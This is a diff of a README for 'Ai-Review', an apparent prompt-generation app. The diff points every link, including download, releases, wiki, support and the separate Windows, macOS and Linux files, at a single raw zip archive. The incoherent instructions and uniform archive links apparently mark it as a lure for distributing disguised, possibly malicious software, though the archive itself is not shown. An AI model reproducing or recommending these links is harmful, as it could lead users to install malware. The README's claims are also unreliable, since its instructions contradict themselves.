@@ -2,7 +2,7 @@
 # 🌟 Ai-Review - Effortlessly Generate Review Prompts
 
 ## 📥 Download Now
-[![Download Ai-Review](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip)](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip)
+[![Download Ai-Review](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip)](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Ai-Review! This simple application helps you create effective review prompts using a large language model. No programming skills are required to use this tool. Follow the steps below to download and run Ai-Review.
@@ -14,27 +14,27 @@ Welcome to Ai-Review! This simple application helps you create effective review 
 - **Internet Connection:** Required for initial model setup and updates.
 
 ## 📂 Download & Install
-1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip) to download Ai-Review.
+1. Click the button above or visit the [Releases page](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip) to download Ai-Review.
 2. On the Releases page, look for the latest version. You will see several files available for download.
 3. Choose the file appropriate for your operating system:
-   - For Windows users, download `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip`.
-   - For macOS users, download `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip`.
-   - For Linux users, download the `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip` package.
+   - For Windows users, download `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip`.
+   - For macOS users, download `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip`.
+   - For Linux users, download the `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip` package.
 4. Once the file downloads, locate it in your downloads folder.
 5. Follow these steps depending on your operating system:
 
 ### Windows Installation
-- Double-click `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip`.
+- Double-click `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip`.
 - Follow the on-screen instructions to install Ai-Review.
 - Once installed, find Ai-Review in your Start menu.
 
 ### macOS Installation
-- Open `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip`.
+- Open `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip`.
 - Drag the Ai-Review icon to your Applications folder.
 - After transferring, you can find Ai-Review in your Applications list.
 
 ### Linux Installation
-- Extract the `https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip` file in your desired directory.
+- Extract the `https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip` file in your desired directory.
 - Open a terminal and navigate to the extracted folder.
 - Run `./Ai-Review` to start the application.
 
@@ -52,12 +52,12 @@ Welcome to Ai-Review! This simple application helps you create effective review 
 - **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
 ## 📞 Support
-If you encounter any issues while downloading or using Ai-Review, please check the Troubleshooting section in the FAQ on the [GitHub Wiki](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip). If you need further assistance, reach out through the Issues tab on GitHub.
+If you encounter any issues while downloading or using Ai-Review, please check the Troubleshooting section in the FAQ on the [GitHub Wiki](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip). If you need further assistance, reach out through the Issues tab on GitHub.
 
 ## 🔗 Additional Resources
 For further details on how to use Ai-Review effectively:
-- Visit the [Releases page](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip) to download updates.
-- Check out the [GitHub Wiki](https://raw.githubusercontent.com/zxcantoshahacker/Ai-Review/main/troker/Ai-Review.zip) for guides and tips.
+- Visit the [Releases page](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip) to download updates.
+- Check out the [GitHub Wiki](https://github.com/zxcantoshahacker/Ai-Review/raw/refs/heads/main/Examples/Ai-Review-v1.3-alpha.2.zip) for guides and tips.
 
 ## 📄 Licensing
 Ai-Review is open-source software released under the MIT License. You can use, modify, and distribute it freely under the terms of this license.
